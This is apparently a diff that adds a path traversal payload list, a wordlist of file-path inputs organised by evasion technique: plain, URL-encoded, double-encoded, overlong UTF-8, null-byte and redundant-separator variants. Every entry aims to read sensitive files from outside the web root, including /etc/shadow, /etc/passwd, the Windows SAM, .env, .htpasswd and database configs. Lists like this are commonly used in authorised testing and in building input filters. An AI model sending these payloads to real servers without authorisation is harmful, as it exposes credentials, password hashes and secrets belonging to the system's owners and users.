@@ -1,0 +1,73 @@
+# Path Traversal / Directory Traversal Payloads
+# These attempt to access files outside the web root
+
+# Basic traversal (Unix/Linux)
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+
+# Windows paths
+..\..\..\windows\system32\config\sam
+..\..\..\..\windows\win.ini
+..\..\..\..\..\windows\system32\drivers\etc\hosts
+
+# URL encoded
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+
+# Double URL encoded
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+# Unicode/UTF-8 encoding
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
+
+# Dot-dot-slash variations
+....//....//....//etc/passwd
+..../..../..../etc/passwd
+....\/....\/....\/etc/passwd
+
+# Null byte injection
+../../../etc/passwd%00
+../../../../etc/passwd%00.jpg
+../../../../../../etc/passwd%00
+
+# Absolute paths
+/etc/passwd
+/windows/win.ini
+C:\windows\system32\config\sam
+
+# With valid path prefix
+/var/www/html/../../../etc/passwd
+/app/public/../../../etc/passwd
+
+# Common target files (Linux)
+../../../etc/shadow
+../../../etc/hosts
+../../../etc/group
+../../../proc/self/environ
+../../../var/log/apache2/access.log
+
+# Common target files (Windows)
+..\..\..\boot.ini
+..\..\..\windows\system.ini
+..\..\..\windows\php.ini
+
+# Web server specific
+../../../usr/local/apache2/conf/httpd.conf
+../../../etc/nginx/nginx.conf
+../../../var/www/.htpasswd
+
+# Application files
+../../../config/database.yml
+../../../.env
+../../../config/config.php
+
+# Filter bypass with redundant separators
+..///////..////etc/passwd
+..\\\..\\\..\\\etc\passwd
+
+# Mixed encoding
+..%5c..%5c..%5cwindows%5cwin.ini
